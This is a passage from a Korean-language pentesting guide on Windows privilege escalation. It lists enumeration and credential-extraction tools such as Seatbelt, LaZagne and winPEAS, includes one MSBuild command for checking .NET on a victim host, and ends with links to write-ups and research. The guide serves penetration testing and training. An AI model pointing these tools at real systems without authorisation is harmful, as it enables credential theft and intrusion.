[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations를 찾으면서 host를 enumeration합니다 (privesc tool이라기보다 정보 수집 tool에 더 가깝습니다) (compile 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 software에서 credentials를 추출합니다 (github에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트입니다**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration을 확인합니다 (github에 precompiled executable 있음). 권장하지 않습니다. Win10에서 잘 동작하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 misconfigurations를 확인합니다 (python에서 exe 생성). 권장하지 않습니다. Win10에서 잘 동작하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 글을 바탕으로 만든 tool입니다 (정상 동작에 accesschk가 필요하지 않지만 사용할 수는 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력을 읽고 동작하는 exploit을 추천합니다 (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력을 읽고 동작하는 exploit을 추천합니다 (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

올바른 버전의 .NET을 사용해 project를 compile해야 합니다([이것을 보세요](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host에 설치된 .NET 버전을 보려면 다음을 수행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
